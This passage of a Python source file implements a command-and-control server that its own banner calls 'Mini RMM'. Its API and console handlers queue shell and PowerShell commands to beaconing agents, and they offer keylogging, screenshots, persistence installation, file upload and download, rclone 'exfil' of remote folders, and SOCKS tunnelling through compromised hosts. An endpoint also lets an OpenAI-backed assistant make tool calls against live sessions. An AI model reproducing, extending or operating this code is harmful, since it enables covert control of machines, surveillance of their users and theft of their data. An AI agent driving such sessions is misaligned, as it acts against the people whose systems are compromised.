                self._json(400, {"error": "invalid_type"})
                return True
            if not command:
                self._json(400, {"error": "missing_command"})
                return True
            srv.set_command(session.id, command, cmd_type)
            srv.record_operator_action(session, command, "queued" if cmd_type == "oneshot" else "persist")
            self._json(200, {"ok": True, "session_id": session.id})
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "exec":
            command = body.get("command", "")
            timeout = float(body.get("timeout", 120))
            if not command:
                self._json(400, {"error": "missing_command"})
                return True
            session = srv.resolve_session(parts[1])
            if session:
                srv.record_operator_action(session, command, "exec")
            result, status = srv.exec_and_wait(parts[1], command, timeout=timeout)
            if status == "not_found":
                self._json(404, {"error": "session_not_found"})
                return True
            if status == "timeout":
                self._json(408, {"error": "timeout", "command": command})
                return True
            self._json(200, {"ok": True, "event": result})
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "upload":
            session = srv.resolve_session(parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            local_b64 = body.get("content_b64", "")
            remote_file = body.get("remote_path", "")
            if not local_b64 or not remote_file:
                self._json(400, {"error": "missing_content_b64_or_remote_path"})
                return True
            data = json.dumps({
                "filename": os.path.basename(remote_file),
                "content": local_b64,
            })
            cmd = f"__UPLOAD__ {remote_file}"
            srv.set_command(session.id, f"{cmd}\n{data}", "oneshot")
            srv.record_operator_action(session, cmd, "upload")
            self._json(200, {"ok": True, "session_id": session.id})
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "download":
            session = srv.resolve_session(parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            remote_path = body.get("remote_path", "").strip()
            if not remote_path:
                self._json(400, {"error": "missing_remote_path"})
                return True
            cmd = srv.queue_agent_download(session, remote_path)
            srv.record_operator_action(session, cmd, "download")
            self._json(200, {"ok": True, "session_id": session.id, "queued": cmd})
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "exfil":
            session = srv.resolve_session(parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            remote_path = body.get("remote_path", "").strip()
            if not remote_path:
                self._json(400, {"error": "missing_remote_path"})
                return True
            profile = (body.get("profile") or DEFAULT_PROFILE).strip()
            dest = (body.get("dest") or "").strip() or None
            try:
                cmd = srv.queue_agent_exfil(session, remote_path, profile, dest=dest)
            except (ValueError, RcloneConfigError) as e:
                self._json(503, {"error": str(e), "rclone": rclone_public_config()})
                return True
            srv.record_operator_action(session, cmd.split("\n", 1)[0], "exfil")
            self._json(
                200,
                {
                    "ok": True,
                    "session_id": session.id,
                    "queued": cmd.split("\n", 1)[0],
                    "profile": profile,
                    "max_bytes": get_rclone_max_bytes(),
                    "rclone": rclone_public_config(),
                },
            )
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "screenshot":
            session = srv.resolve_session(parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            srv.set_command(session.id, "__SCREENSHOT__", "oneshot")
            srv.record_operator_action(session, "__SCREENSHOT__", "screenshot")
            self._json(200, {"ok": True, "session_id": session.id, "queued": "__SCREENSHOT__"})
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "socks":
            session = srv.resolve_session(parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            if body.get("stop"):
                srv.stop_socks(session.id)
                self._json(200, {"ok": True, "session_id": session.id, "stopped": True})
                return True
            port = int(body.get("port", DEFAULT_SOCKS_PORT))
            if port < 1 or port > 65535:
                self._json(400, {"error": "invalid_port"})
                return True
            bind_host = str(body.get("bind_host", DEFAULT_BIND_HOST))
            if not srv.start_socks(session.id, port=port, bind_host=bind_host):
                self._json(500, {"error": "socks_start_failed"})
                return True
            self._json(
                200,
                {
                    "ok": True,
                    "session_id": session.id,
                    "socks_url": f"socks5://{bind_host}:{port}",
                    "socks_active": True,
                },
            )
            return True

        if parts == ["ai", "chat"]:
            openai_key = (body.get("openai_api_key") or os.environ.get("OPENAI_API_KEY", "")).strip()
            if not openai_key:
                self._json(400, {"error": "missing_openai_api_key"})
                return True
            messages = body.get("messages") or []
            if not messages:
                self._json(400, {"error": "missing_messages"})
                return True
            model = str(body.get("model") or "gpt-5.2")
            selected = body.get("selected_session_id")
            skill_ids = body.get("skill_ids")
            if skill_ids is not None and not isinstance(skill_ids, list):
                self._json(400, {"error": "invalid_skill_ids"})
                return True
            rmm_token = (self._api_token_from_request() or API_TOKEN or "").strip()
            if not rmm_token:
                self._json(401, {
                    "error": "unauthorized",
                    "detail": "Valid RMM_API_TOKEN required for AI tool calls",
                })
                return True
            try:
                from rmm_ai import run_ai_chat

                result = run_ai_chat(
                    rmm_base_url=self._operator_api_base_url(),
                    rmm_token=rmm_token,
                    openai_api_key=openai_key,
                    messages=messages,
                    model=model,
                    selected_session_id=selected,
                    exegol_mcp_enabled=body.get("exegol_mcp_enabled"),
                    exegol_mcp_url=body.get("exegol_mcp_url"),
                    exegol_mcp_token=body.get("exegol_mcp_token"),
                    skill_ids=skill_ids,
                )
                if result.get("ok") and selected:
                    stored = list(messages)
                    reply = result.get("message")
                    if isinstance(reply, str):
                        assistant_row: dict = {"role": "assistant", "content": reply}
                        tool_calls = result.get("tool_calls_made")
                        if isinstance(tool_calls, list) and tool_calls:
                            assistant_row["tool_calls_made"] = tool_calls
                        stored.append(assistant_row)
                        srv.save_ai_chat(str(selected), stored)
                status = 200 if result.get("ok") else 500
                self._json(status, result)
            except ValueError as e:
                self._json(400, {"error": str(e)})
            except RuntimeError as e:
                self._json(502, {"error": "openai_error", "detail": str(e)})
            except Exception as e:
                self._json(500, {"error": "ai_chat_failed", "detail": str(e)})
            return True

        self._json(404, {"error": "not_found"})
        return True

    def _request_base_url(self) -> str:
        host = self.headers.get("Host", f"127.0.0.1:{PORT}")
        proto = self.headers.get("X-Forwarded-Proto", "").strip().lower()
        if proto not in ("http", "https"):
            proto = "http"
        return f"{proto}://{host}"

    def _operator_api_base_url(self) -> str:
        """Loopback URL for in-process clients (AI/MCP) calling the operator API."""
        host = LISTEN_HOST
        if host in ("0.0.0.0", "::", ""):
            host = "127.0.0.1"
        elif host == "::1":
            host = "127.0.0.1"
        return f"http://{host}:{PORT}"

    def _handle_api_patch(self, path, body):
        if not self._api_authorized():
            self._api_unauthorized()
            return True
        parts = self._api_path_parts(path)
        if parts is None:
            return False
        srv = self.server_instance

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "config":
            session = srv.resolve_session(parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            ok = srv.update_session_config(
                session.id,
                sleep_seconds=body.get("sleep_seconds"),
                jitter_percent=body.get("jitter_percent"),
            )
            if ok:
                parts_cfg = []
                if body.get("sleep_seconds") is not None:
                    parts_cfg.append(f"sleep={body['sleep_seconds']}")
                if body.get("jitter_percent") is not None:
                    parts_cfg.append(f"jitter={body['jitter_percent']}")
                if parts_cfg:
                    srv.record_operator_action(session, " ".join(parts_cfg), "config")
                self._json(200, {"ok": True, "session": session.to_dict()})
            else:
                self._json(404, {"error": "session_not_found"})
            return True

        self._json(404, {"error": "not_found"})
        return True

    def _handle_api_delete(self, path):
        if not self._api_authorized():
            self._api_unauthorized()
            return True
        parts = self._api_path_parts(path)
        if parts is None:
            return False
        srv = self.server_instance

        if len(parts) == 4 and parts[0] == "sessions" and parts[2] == "ai" and parts[3] == "chat":
            session_id, _messages = srv.get_ai_chat(parts[1])
            if session_id is None:
                self._json(404, {"error": "session_not_found"})
                return True
            srv.clear_ai_chat(session_id)
            self._json(200, {"ok": True, "session_id": session_id})
            return True

        if len(parts) == 2 and parts[0] == "sessions":
            ok, detail = srv.kill_session(parts[1])
            if not ok:
                self._json(404, {"error": "session_not_found"})
                return True
            self._json(200, {"ok": True, "session_id": detail})
            return True

        if parts == ["history"]:
            deleted, errors = srv.clear_session_history()
            self._json(200, {"ok": True, "deleted": deleted, "errors": errors})
            return True

        if len(parts) == 2 and parts[0] == "history":
            ok, session_id, err, artifacts = srv.delete_history_session(parts[1])
            if not ok:
                status = 409 if err == "session_still_active" else 404
                self._json(status, {"error": err or "history_not_found"})
                return True
            body = {"ok": True, "session_id": session_id}
            if artifacts:
                body["artifacts_purged"] = artifacts
            self._json(200, body)
            return True

        self._json(404, {"error": "not_found"})
        return True
    
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        qs = urllib.parse.parse_qs(parsed.query)

        if path == f"{API_PREFIX}/ws":
            if self._handle_websocket_upgrade(qs):
                return

        if path.startswith(API_PREFIX):
            if self._handle_api_get(path, qs):
                return
            self._respond(404, "Not Found")
            return

        if path == "/tools/rclone.exe":
            if not self._beacon_authorized(qs):
                self._beacon_forbidden()
                return
            err, session_id = self._beacon_session_id_from_qs(qs)
            if err:
                self._respond(400, err)
                return
            if not self.server_instance.get_session(session_id):
                self._respond(404, "Unknown session")
                return
            if self._serve_rclone_tool():
                return

        if self._serve_web(path):
            return
        
        if path in ("/register", "/cmd", "/ping", "/socks", "/socks-ws"):
            if not self._beacon_authorized(qs):
                self._beacon_forbidden()
                return

        if path == "/register":
            raw_id = qs.get("id", [None])[0]
            if raw_id is None or not str(raw_id).strip():
                self._respond(400, "Missing session ID")
                return
            session_id = validate_beacon_session_id(str(raw_id))
            if not session_id:
                self._respond(400, "INVALID SESSION ID")
                return
            hostname = qs.get("h", ["unknown"])[0]
            username = qs.get("u", ["unknown"])[0]
            ip = self.client_address[0]
            sleep_seconds = None
            jitter_percent = None
            sync_client = str(qs.get("sync", ["0"])[0]).lower() in ("1", "true", "yes")
            try:
                if qs.get("s", [None])[0] is not None:
                    sleep_seconds = int(qs["s"][0])
            except (TypeError, ValueError):
                pass
            try:
                if qs.get("j", [None])[0] is not None:
                    jitter_percent = int(qs["j"][0])
            except (TypeError, ValueError):
                pass
            reg = self.server_instance.register_session(
                session_id,
                hostname,
                username,
                ip,
                sleep_seconds=sleep_seconds,
                jitter_percent=jitter_percent,
                sync_client_config=sync_client,
            )
            if reg is None:
                self._respond(403, "TERMINATED")
            else:
                self._respond(200, "REGISTERED" if reg else "UPDATED")
        
        elif path == "/cmd":
            err, session_id = self._beacon_session_id_from_qs(qs)
            if err:
                self._respond(400, err)
            else:
                cmd, resp_type = self.server_instance.get_command(session_id)
                response = json.dumps({
                    "command": cmd,
                    "type": resp_type,
                    "socks_active": self.server_instance.socks_active(session_id),
                })
                self._respond(200, response, "application/json")
        
        elif path == "/ping":
            err, session_id = self._beacon_session_id_from_qs(qs)
            if err:
                self._respond(400, err)
            else:
                self.server_instance.touch_session(session_id)
                self._respond(200, "PONG")

        elif path in ("/socks", "/socks-ws"):
            err, session_id = self._beacon_session_id_from_qs(qs)
            if err:
                self._respond(400, err)
            elif self.headers.get("Upgrade", "").lower() == "websocket":
                if not self.server_instance.socks_active(session_id):
                    self._respond(403, "SOCKS relay not active")
                else:
                    self._handle_socks_agent_websocket(session_id)
            elif path == "/socks-ws":
                self._respond(426, "Upgrade Required")
            else:
                self.server_instance.touch_session(session_id)
                tasks = self.server_instance.socks.poll_tasks(session_id)
                active = self.server_instance.socks_active(session_id)
                self._respond(
                    200,
                    json.dumps({"active": active, "tasks": tasks}),
                    "application/json",
                )
        
        else:
            self._respond(404, "Not Found")
    
    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        qs = urllib.parse.parse_qs(parsed.query)

        if path.startswith(API_PREFIX):
            try:
                body = self._read_json_body()
            except ValueError:
                self._json(413, {"error": "payload_too_large"})
                return
            except json.JSONDecodeError:
                self._json(400, {"error": "invalid_json"})
                return
            if self._handle_api_post(path, body):
                return
            self._respond(404, "Not Found")
            return

        if path in ("/result", "/socks"):
            if not self._beacon_authorized(qs):
                self._beacon_forbidden()
                return
            try:
                body = self._read_body_bytes().decode(errors="replace")
            except ValueError:
                self._respond(413, "PAYLOAD TOO LARGE")
                return

        if path == "/socks":
            err, session_id = self._beacon_session_id_from_qs(qs)
            if err:
                self._respond(400, err)
                return
            self.server_instance.touch_session(session_id)
            if not self.server_instance.socks.post_responses(session_id, body):
                self._respond(400, "INVALID SOCKS PAYLOAD")
            else:
                self._respond(200, "OK")
            return

        if path == "/result":
            raw_id = qs.get("id", [None])[0]
            result_type = qs.get("type", ["output"])[0]
            if raw_id is None or not str(raw_id).strip():
                self._respond(400, "Missing session ID")
                return
            session_id = validate_beacon_session_id(str(raw_id))
            if not session_id:
                self._respond(400, "INVALID SESSION ID")
                return
            self._respond(200, "OK")
            threading.Thread(
                target=self.server_instance.handle_result,
                args=(session_id, body, result_type),
                daemon=True,
            ).start()
            return

        self._respond(404, "Not Found")

    def do_PATCH(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        if not path.startswith(API_PREFIX):
            self._respond(404, "Not Found")
            return
        try:
            body = self._read_json_body()
        except ValueError:
            self._json(413, {"error": "payload_too_large"})
            return
        except json.JSONDecodeError:
            self._json(400, {"error": "invalid_json"})
            return
        if self._handle_api_patch(path, body):
            return
        self._respond(404, "Not Found")

    def do_DELETE(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        if not path.startswith(API_PREFIX):
            self._respond(404, "Not Found")
            return
        if self._handle_api_delete(path):
            return
        self._respond(404, "Not Found")

class CommandInterface:
    def __init__(self, server):
        self.server = server
        self.aliases = {
            "ls": "dir",
            "help": "?",
            "sessions": "list",
            "exit": "quit"
        }
    
    def show_help(self):
        help_text = f"""
{Colors.BOLD}Available Commands:{Colors.END}

{Colors.CYAN}Session Management:{Colors.END}
  {Colors.GREEN}list{Colors.END}                     - List active sessions
  {Colors.GREEN}use <session_id>{Colors.END}         - Select a session (full ID or first 4+ chars)
  {Colors.GREEN}info{Colors.END}                     - Show current session info
  {Colors.GREEN}background{Colors.END}               - Return to global view
  {Colors.GREEN}kill <session_id>{Colors.END}        - End session and stop the remote client

{Colors.CYAN}Beacon Configuration:{Colors.END}
  {Colors.GREEN}set_sleep <seconds>{Colors.END}      - Set beacon interval (1-3600 seconds)
  {Colors.GREEN}set_jitter <percent>{Colors.END}     - Set jitter percentage (0-100)
  {Colors.GREEN}show_config{Colors.END}              - Show current session config

{Colors.CYAN}Command Execution:{Colors.END}
  {Colors.DIM}(commands queue FIFO between client polls){Colors.END}
  {Colors.DIM}Windows CMD: use double quotes for paths with spaces; NET GROUP needs group name before /domain.{Colors.END}
  {Colors.GREEN}<command>{Colors.END}                - CMD (cmd.exe), e.g. sc query, dir /w
  {Colors.GREEN}PS: / powershell: <script>{Colors.END}   - Windows PowerShell (powershell.exe)
  {Colors.GREEN}pwsh: <script>{Colors.END}           - PowerShell 7 if pwsh is installed
  {Colors.GREEN}cmd: <line>{Colors.END}             - Explicit CMD (same as default)
  {Colors.GREEN}shell <command>{Colors.END}          - Same as a bare command
  {Colors.GREEN}persist <command>{Colors.END}        - Persistent command (repeats)
  {Colors.GREEN}stop{Colors.END}                     - Stop persistent command

{Colors.CYAN}File Operations:{Colors.END}
  {Colors.GREEN}download <file>{Colors.END}          - Download file from target
  {Colors.GREEN}exfil <path> [profile]{Colors.END}   - Upload remote file or folder via rclone (agent)
  {Colors.GREEN}upload <local> <remote>{Colors.END}  - Upload file to target

{Colors.CYAN}Tunneling:{Colors.END}
  {Colors.GREEN}socks list{Colors.END}            - List all SOCKS relays and connected agents
  {Colors.GREEN}socks [port]{Colors.END}           - SOCKS5 on 127.0.0.1 (default port {DEFAULT_SOCKS_PORT})
  {Colors.GREEN}socks stop{Colors.END}             - Stop SOCKS relay for this session

{Colors.CYAN}Reconnaissance:{Colors.END}
  {Colors.GREEN}screenshot{Colors.END}               - Capture screenshot
  {Colors.GREEN}keylog start/stop/dump{Colors.END}   - Keylogging operations

{Colors.CYAN}Persistence:{Colors.END}
  {Colors.GREEN}install_persist{Colors.END}          - Install persistence
  {Colors.GREEN}remove_persist{Colors.END}           - Remove persistence

{Colors.CYAN}Other:{Colors.END}
  {Colors.GREEN}clear{Colors.END}                    - Clear screen
  {Colors.GREEN}quit{Colors.END}                     - Exit RMM server

{Colors.YELLOW}Tip:{Colors.END} Use TAB key for command completion and history navigation
"""
        self.server.tty_print(help_text)
    
    def execute_command(self, cmd_line):
        if not cmd_line.strip():
            return True

        parts = cmd_line.strip().split()
        cmd = parts[0].lower()
        args = parts[1:] if len(parts) > 1 else []

        # Handle aliases
        cmd = self.aliases.get(cmd, cmd)

        # Global commands
        if cmd in ["quit", "exit"]:
            self.server.tty_print(f"{Colors.YELLOW}Shutting down server...{Colors.END}")
            if not getattr(self.server, "_cli_use_ptk", False):
                readline.write_history_file(HISTORY_FILE)
            self.server.running = False
            return False

        elif cmd == "list":
            self.server.list_sessions()

        elif cmd == "kill":
            if args:
                session_id_or_prefix = args[0]
                session = self.server.get_session(session_id_or_prefix)
                if not session:
                    session = self.server.find_session_by_prefix(session_id_or_prefix)

                if session:
                    with self.server.session_lock:
                        self.server.killed_sessions.add(session.id)
                        del self.server.sessions[session.id]
                        self.server.tty_print(f"{Colors.GREEN}Session {session.id[:8]} terminated (client will exit on next beacon){Colors.END}")
                        if self.server.current_session == session.id:
                            self.server.current_session = None
                else:
                    self.server.tty_print(f"{Colors.RED}Session not found: {session_id_or_prefix}{Colors.END}")
            else:
                self.server.tty_print(f"{Colors.RED}Usage: kill <session_id>{Colors.END}")

        elif cmd == "use":
            if args:
                session_id_or_prefix = args[0]
                session = self.server.get_session(session_id_or_prefix)
                if not session:
                    session = self.server.find_session_by_prefix(session_id_or_prefix)

                if session:
                    self.server.current_session = session.id
                    self.server.tty_print(f"{Colors.GREEN}Selected session: {session}{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Session not found: {session_id_or_prefix}{Colors.END}")
                    self.server.tty_print(f"{Colors.YELLOW}Use 'list' to see available sessions{Colors.END}")
            else:
                self.server.tty_print(f"{Colors.RED}Usage: use <session_id>{Colors.END}")
                self.server.tty_print(f"{Colors.YELLOW}You can use full ID or first 4+ characters (e.g., 'use 2318'){Colors.END}")

        elif cmd == "info":
            if self.server.current_session:
                session = self.server.get_session(self.server.current_session)
                if session:
                    self.server.tty_print(f"\n{Colors.BOLD}Session Information:{Colors.END}")
                    self.server.tty_print(f"  ID: {session.id}", ansi=False)
                    self.server.tty_print(f"  User: {session.username}", ansi=False)
                    self.server.tty_print(f"  Hostname: {session.hostname}", ansi=False)
                    self.server.tty_print(f"  IP: {session.ip or 'N/A'}", ansi=False)
                    self.server.tty_print(f"  First Seen: {session.first_seen}", ansi=False)
                    self.server.tty_print(f"  Last Seen: {session.last_seen}", ansi=False)
                    self.server.tty_print(f"  Working Dir: {session.work_dir or 'Unknown'}", ansi=False)
                    self.server.tty_print(f"  OS: {session.os_type}", ansi=False)
                    self.server.tty_print(f"  Sleep Interval: {session.sleep_seconds} seconds", ansi=False)
                    self.server.tty_print(f"  Jitter: {session.jitter_percent}%\n", ansi=False)
            else:
                self.server.tty_print(f"{Colors.YELLOW}No session selected{Colors.END}")

        elif cmd == "show_config":
            if self.server.current_session:
                session = self.server.get_session(self.server.current_session)
                if session:
                    jitter_range = session.sleep_seconds * session.jitter_percent / 100
                    min_sleep = session.sleep_seconds - jitter_range
                    max_sleep = session.sleep_seconds + jitter_range
                    self.server.tty_print(f"\n{Colors.BOLD}Current Beacon Configuration:{Colors.END}")
                    self.server.tty_print(f"  Session: {session.id[:8]}", ansi=False)
                    self.server.tty_print(
                        f"  Sleep Interval: {Colors.GREEN}{session.sleep_seconds}{Colors.END} seconds"
                    )
                    self.server.tty_print(
                        f"  Jitter Percentage: {Colors.GREEN}{session.jitter_percent}{Colors.END}%"
                    )
                    self.server.tty_print(
                        f"  Effective Range: {Colors.CYAN}{min_sleep:.1f}{Colors.END} - "
                        f"{Colors.CYAN}{max_sleep:.1f}{Colors.END} seconds\n"
                    )
            else:
                self.server.tty_print(f"{Colors.YELLOW}No session selected{Colors.END}")

        elif cmd == "set_sleep":
            if self.server.current_session:
                if args:
                    try:
                        new_sleep = int(args[0])
                        if 1 <= new_sleep <= 3600:
                            self.server.update_session_config(self.server.current_session, sleep_seconds=new_sleep)
                            self.server.tty_print(f"{Colors.GREEN}Sleep interval updated to {new_sleep} seconds{Colors.END}")
                            self.server.tty_print(f"{Colors.DIM}New config will take effect on next beacon{Colors.END}")
                        else:
                            self.server.tty_print(f"{Colors.RED}Sleep must be between 1 and 3600 seconds{Colors.END}")
                    except ValueError:
                        self.server.tty_print(f"{Colors.RED}Invalid number{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: set_sleep <seconds (1-3600)>{Colors.END}")
            else:
                self.server.tty_print(f"{Colors.YELLOW}No session selected. Use 'use <id>' first{Colors.END}")

        elif cmd == "set_jitter":
            if self.server.current_session:
                if args:
                    try:
                        new_jitter = int(args[0])
                        if 0 <= new_jitter <= 100:
                            self.server.update_session_config(self.server.current_session, jitter_percent=new_jitter)
                            self.server.tty_print(f"{Colors.GREEN}Jitter updated to {new_jitter}%{Colors.END}")
                            self.server.tty_print(f"{Colors.DIM}New config will take effect on next beacon{Colors.END}")
                        else:
                            self.server.tty_print(f"{Colors.RED}Jitter must be between 0 and 100{Colors.END}")
                    except ValueError:
                        self.server.tty_print(f"{Colors.RED}Invalid number{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: set_jitter <percent (0-100)>{Colors.END}")
            else:
                self.server.tty_print(f"{Colors.YELLOW}No session selected. Use 'use <id>' first{Colors.END}")

        elif cmd == "background":
            self.server.current_session = None
            self.server.tty_print(f"{Colors.GREEN}Returned to global view{Colors.END}")

        elif cmd == "help" or cmd == "?":
            self.show_help()

        elif cmd == "clear":
            os.system('clear' if os.name == 'posix' else 'cls')

        # Commands that require a selected session
        elif self.server.current_session:
            if cmd in ["shell", "exec"]:
                command = " ".join(args)
                if command:
                    self.server.set_command(self.server.current_session, command, "oneshot")
                    self.server.tty_print(f"{Colors.DIM}Command sent...{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: shell <command>{Colors.END}")

            elif cmd == "persist":
                command = " ".join(args)
                if command:
                    self.server.set_command(self.server.current_session, command, "persistent")
                    self.server.tty_print(f"{Colors.DIM}Persistent command activated (use 'stop' to end){Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: persist <command>{Colors.END}")

            elif cmd == "stop":
                self.server.set_command(self.server.current_session, "__STOP__", "oneshot")
                self.server.tty_print(f"{Colors.DIM}Persistent command stopped{Colors.END}")

            elif cmd == "download":
                if args:
                    filepath = " ".join(args)
                    session = self.server.get_session(self.server.current_session)
                    if session:
                        self.server.queue_agent_download(session, filepath)
                        self.server.tty_print(f"{Colors.DIM}Downloading {filepath}...{Colors.END}")
                    else:
                        self.server.tty_print(f"{Colors.RED}No active session{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: download <file>{Colors.END}")

            elif cmd == "exfil":
                if args:
                    session = self.server.get_session(self.server.current_session)
                    if not session:
                        self.server.tty_print(f"{Colors.RED}No active session{Colors.END}")
                    else:
                        filepath = args[0]
                        profile = args[1] if len(args) > 1 else DEFAULT_PROFILE
                        try:
                            self.server.queue_agent_exfil(session, filepath, profile)
                            self.server.tty_print(
                                f"{Colors.DIM}Exfil queued ({profile}): {filepath}...{Colors.END}"
                            )
                        except (ValueError, RcloneConfigError) as e:
                            self.server.tty_print(f"{Colors.RED}{e}{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: exfil <remote_path> [profile]{Colors.END}")

            elif cmd == "upload":
                if len(args) >= 2:
                    local_file = args[0]
                    remote_file = args[1]
                    if os.path.exists(local_file):
                        with open(local_file, 'rb') as f:
                            content = base64.b64encode(f.read()).decode()
                        data = json.dumps({
                            "filename": os.path.basename(remote_file),
                            "content": content
                        })
                        self.server.set_command(self.server.current_session, f"__UPLOAD__ {remote_file}\n{data}", "oneshot")
                        self.server.tty_print(f"{Colors.DIM}Uploading {local_file} to {remote_file}...{Colors.END}")
                    else:
                        self.server.tty_print(f"{Colors.RED}Local file not found: {local_file}{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: upload <local_file> <remote_file>{Colors.END}")

            elif cmd == "screenshot":
                self.server.set_command(self.server.current_session, "__SCREENSHOT__", "oneshot")
                self.server.tty_print(f"{Colors.DIM}Taking screenshot...{Colors.END}")

            elif cmd in ["keylog", "keylogger"]:
                if args:
                    action = args[0]
                    self.server.set_command(self.server.current_session, f"__KEYLOG__ {action}", "oneshot")
                    self.server.tty_print(f"{Colors.DIM}Keylog {action}...{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: keylog start/stop/dump{Colors.END}")

            elif cmd == "install_persist":
                self.server.set_command(self.server.current_session, "__INSTALL_PERSIST__", "oneshot")
                self.server.tty_print(f"{Colors.DIM}Installing persistence...{Colors.END}")

            elif cmd == "remove_persist":
                self.server.set_command(self.server.current_session, "__REMOVE_PERSIST__", "oneshot")
                self.server.tty_print(f"{Colors.DIM}Removing persistence...{Colors.END}")

            elif cmd == "socks":
                if args and args[0].lower() == "list":
                    relays = self.server.list_socks_status()
                    if not relays:
                        self.server.tty_print(f"{Colors.DIM}No active SOCKS relays{Colors.END}")
                    else:
                        for r in relays:
                            agent = (
                                f"{r.get('username')}@{r.get('hostname')}"
                                if r.get("hostname")
                                else r["session_id"][:8]
                            )
                            ch = r.get("agent_channel", "?")
                            url = r.get("socks_url", "")
                            tunnels = r.get("active_tunnels", 0)
                            self.server.tty_print(
                                f"{Colors.GREEN}{url}{Colors.END} → {agent} "
                                f"({ch}, tunnels={tunnels}, beacon={r.get('beacon_status')})",
                                ansi=False,
                            )
                    return True
                if args and args[0].lower() == "stop":
                    self.server.stop_socks(self.server.current_session)
                    self.server.tty_print(f"{Colors.DIM}SOCKS relay stopped{Colors.END}")
                else:
                    port = DEFAULT_SOCKS_PORT
                    if args:
                        try:
                            port = int(args[0])
                            if port < 1 or port > 65535:
                                raise ValueError
                        except ValueError:
                            self.server.tty_print(f"{Colors.RED}Invalid port (1-65535){Colors.END}")
                            return True
                    if self.server.start_socks(self.server.current_session, port):
                        self.server.tty_print(
                            f"{Colors.GREEN}SOCKS5 on {DEFAULT_BIND_HOST}:{port} — "
                            f"point tools at socks5://127.0.0.1:{port}{Colors.END}"
                        )
                        self.server.tty_print(
                            f"{Colors.DIM}Client must beacon; traffic exits the remote host. "
                            f"Use 'socks stop' when done.{Colors.END}"
                        )
                    else:
                        self.server.tty_print(f"{Colors.RED}Failed to start SOCKS (session or bind error){Colors.END}")

            else:
                # Regular shell command
                self.server.set_command(self.server.current_session, cmd_line, "oneshot")
                self.server.tty_print(f"{Colors.DIM}Command sent...{Colors.END}")

        else:
            self.server.tty_print(f"{Colors.YELLOW}No session selected. Use 'list' then 'use <id>' or type 'help'{Colors.END}")
            self.server.tty_print(f"{Colors.YELLOW}Tip: You can use the first 4-8 characters of the session ID (e.g., 'use 2318'){Colors.END}")

        return True

def main():
    global PORT, API_TOKEN, BEACON_SECRET, INSECURE, LISTEN_HOST

    parser = argparse.ArgumentParser(description="Mini RMM HTTP server")
    parser.add_argument("port", nargs="?", type=int, default=8080, help="Listen port (default: 8080)")
    parser.add_argument(
        "--cli",
        action="store_true",
        help="Run embedded interactive console (default: API-only headless)",
    )
    parser.add_argument(
        "--token",
        default="",
        help="Operator API token (or set RMM_API_TOKEN)",
    )
    parser.add_argument(
        "--beacon-secret",
        default="",
        help="Beacon shared secret (or set RMM_BEACON_SECRET); required for clients",
    )
    parser.add_argument(
        "--bind",
        default=LISTEN_HOST,
        help="Listen address (default: 127.0.0.1; use 0.0.0.0 only behind a firewall)",
    )
    parser.add_argument(
        "--insecure",
        action="store_true",
        help="LAB ONLY: allow missing API/beacon secrets (open C2 — never on a network)",
    )
    parser.add_argument(
        "--rclone-profiles",
        default="",
        metavar="PATH",
        help="rclone exfil profiles JSON file (or set RMM_RCLONE_PROFILES_FILE)",
    )
    parser.add_argument(
        "--rclone-max-bytes",
        default=None,
        type=int,
        metavar="N",
        help="Max exfil size in bytes (file or folder); 0 = unlimited (or set RMM_RCLONE_MAX_BYTES)",
    )
    args = parser.parse_args()
    PORT = args.port
    LISTEN_HOST = args.bind
    INSECURE = args.insecure
    if args.token:
        API_TOKEN = args.token.strip()
    if args.beacon_secret:
        BEACON_SECRET = args.beacon_secret.strip()
    if args.rclone_profiles:
        profiles_path = os.path.abspath(args.rclone_profiles.strip())
        if not os.path.isfile(profiles_path):
            print(
                f"{Colors.RED}[!] rclone profiles file not found: {profiles_path}{Colors.END}",
                file=sys.stderr,
            )
            sys.exit(1)
        os.environ["RMM_RCLONE_PROFILES_FILE"] = profiles_path
    if args.rclone_max_bytes is not None:
        if args.rclone_max_bytes < 0:
            print(
                f"{Colors.RED}[!] --rclone-max-bytes must be >= 0 (0 = unlimited){Colors.END}",
                file=sys.stderr,
            )
            sys.exit(1)
        os.environ["RMM_RCLONE_MAX_BYTES"] = str(args.rclone_max_bytes)

    if not INSECURE:
        if not API_TOKEN:
            print(
                f"{Colors.RED}[!] Set RMM_API_TOKEN (or --token). "
                f"Use --insecure for local lab only.{Colors.END}",
                file=sys.stderr,
            )
            sys.exit(1)
        if not BEACON_SECRET:
            print(
                f"{Colors.RED}[!] Set RMM_BEACON_SECRET (or --beacon-secret). "
                f"Use --insecure for local lab only.{Colors.END}",
                file=sys.stderr,
            )
            sys.exit(1)
    else:
        print(
            f"{Colors.RED}[!] --insecure: operator API and beacon endpoints are unauthenticated{Colors.END}"
        )

    print(f"{Colors.BOLD}{Colors.HEADER}")
    print("""
    ╔═══════════════════════════════════════════╗
    ║        Mini RMM Server v3.0                ║
    ║     HTTP Command & Control + REST API      ║
    ║   Operator CLI: python rmm_cli.py          ║
